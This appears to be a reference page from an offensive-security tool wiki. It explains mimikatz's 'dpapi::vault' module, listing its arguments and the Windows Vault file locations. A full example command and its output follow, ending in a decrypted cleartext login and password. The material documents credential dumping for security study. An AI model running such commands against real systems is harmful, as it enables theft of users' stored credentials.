# vault

`dpapi::vault` decrypts DPAPI vault credentials from the [Credential Store](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0). It has the following command line arguments:

* `/cred`: the _**.vcrd**_ files can be found at `C:\Users\<UserName>\AppData\Local\Microsoft\Vault`, `C:\Users\<UserName>\AppData\Roaming\Microsoft\Vault, C:\ProgramData\Microsoft\Vault` and `C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault`
* `/policy`: The _**policy.vpol**_ file can be found at `C:\ProgramData\Microsoft\Vault\`
* `/password`: the password to decrypt the vault credentials
* `/masterkey`: the masterkey to use for decryption. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi).
* `/unprotect`: display the decryption results on screen

```
mimikatz # dpapi::vault /cred:"C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\21CD6FA9B5E4C7D1D04AE0182DD7F440F54E02ED.vcrd" /policy:"C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol" /masterkey:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
**VAULT CREDENTIAL**
  SchemaId            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
  unk0                : 00000004 - 4
  LastWritten         : 13/12/2021 21:33:59
  unk1                : ffffffff - 4294967295
  unk2                : 00000000 - 0
  FriendlyName        : Internet Explorer
  dwAttributesMapSize : 00000030 - 48
  * Attribute   1 @ offset 00000080 - 128  (unk 00000020 - 32)
  * Attribute   2 @ offset 000000b5 - 181  (unk 00000020 - 32)
  * Attribute   3 @ offset 000000ea - 234  (unk 00000020 - 32)
  * Attribute 100 @ offset 00000100 - 256  (unk 00000020 - 32)
  **VAULT CREDENTIAL ATTRIBUTE**
    id      : 00000001 - 1
    unk0/1/2: 00000002/00000007/0000000a
    Data    : 168989db87d1e9011a33035f2aa7d104ba57ed82ca427d10b07ca202c8f1d272
  **VAULT CREDENTIAL ATTRIBUTE**
    id      : 00000002 - 2
    unk0/1/2: 00000002/00000007/0000000a
    Data    : ee08e5dc3f49367fc97b4facc65a748b27f3d814fe4ce177c1eee8c221928839
  **VAULT CREDENTIAL ATTRIBUTE**
    id      : 00000003 - 3
    unk0/1/2: 00000000/00000007/0000000a
  **VAULT CREDENTIAL ATTRIBUTE**
    id      : 00000064 - 100
    unk0/1/2: 00000000/00000008/0000000a
    IV      : edd18a92b5db9a1984bd6600240b642a
    Data    : 9c8f1a59cd4c3a7288c7612e51ba9822bda64128729eb0bd501e182a3eca1890a7212a41836961320fb07651c7206185a8c39f64f1ac60d244e38a3be85b766ed6d7db5973a2b527c3eb4f0900fbef5f03cc14a9b333148316fbc06098c47ced7af023b4c74c2409c446e95156e16633538c5df6899cb14266445efcbe0b8a5b592806a31cdbdf061ca6086e6086af44c2631bdc393d30174a81cd86816b9472c68fe274592c024f0526ff5cf5aa43a960b1a5bf10468876bcda3412507ea393a21cbb617bc93ad8f08f21ad83aa8055

**VAULT POLICY**
  version : 00000001 - 1
  vault   : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
  Name    : Web Credentials
  unk0/1/2: 00000001/00000000/00000001
  **VAULT POLICY KEY**
    unk0  : {dd73da0b-fd83-4712-af8b-d153c710c6b9}
    unk1  : {dd73da0b-fd83-4712-af8b-d153c710c6b9}
    **BLOB**
      dwVersion          : 00000001 - 1
      guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
      dwMasterKeyVersion : 00000001 - 1
      guidMasterKey      : {5c22983f-77ee-41e4-9086-8073d664e417}
      dwFlags            : 20000000 - 536870912 (system ; )
      dwDescriptionLen   : 00000000 - 0
      szDescription      : (null)
      algCrypt           : 00006603 - 26115 (CALG_3DES)
      dwAlgCryptLen      : 000000c0 - 192
      dwSaltLen          : 00000010 - 16
      pbSalt             : 07da103f232873a46fcaba89df0a9b53
      dwHmacKeyLen       : 00000000 - 0
      pbHmackKey         :
      algHash            : 00008004 - 32772 (CALG_SHA1)
      dwAlgHashLen       : 000000a0 - 160
      dwHmac2KeyLen      : 00000010 - 16
      pbHmack2Key        : c66b772816ab01918d13cafea8163d12
      dwDataLen          : 00000068 - 104
      pbData             : e3ce970b77864701ac345f5f3afef1419f36e628ce32e5053e13fc81727acfc62d7d70126ea5b3e3686bf527bb7ec6f609dc787d10b1329e524994a59d81a2e79115c55127c63d28ba75fa000425d650d21b01465c6affbe5f9b4d01aaa143b3e993042a6b63c1e7
      dwSignLen          : 00000014 - 20
      pbSign             : c39e8a8fb985ac20bc0a607485f49d7fbe45b678



Decrypting Policy Keys:
 * volatile cache: GUID:{5c22983f-77ee-41e4-9086-8073d664e417};KeyHash:850247e2dd89c50536c05bdcee1a56c395e752cf;Key:available
 * masterkey     : 3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
  AES128 key: 0fdfe3d0bf2550e7fd25f37898b3dd77
  AES256 key: 888bb82eca576c5d154f024d2980b9a1eacb904ad86b1265ac25b816f57fb3d7

  > Attribute 1 : 7b506f2d6b81d939a8e0456f036ee8970856ff70
  > Attribute 2 : 0a0c5eef791157ee37f51258c5747ee205a4f18c
  > Attribute 3 :
  > Attribute 100 :
  **VAULT CREDENTIAL CLEAR ATTRIBUTES**
    version: 00000001 - 1
    count  : 00000004 - 4
    unk    : 00000001 - 1

    * identity      : myemail@hotmail.com
    * ressource     : https://login.live.com/
    * authenticator : MySuperDuperPass
    * property 100  : c5 a6 4d 4e 34 22 d9 4a a5 9d c8 66 c8 3e cb a6
```
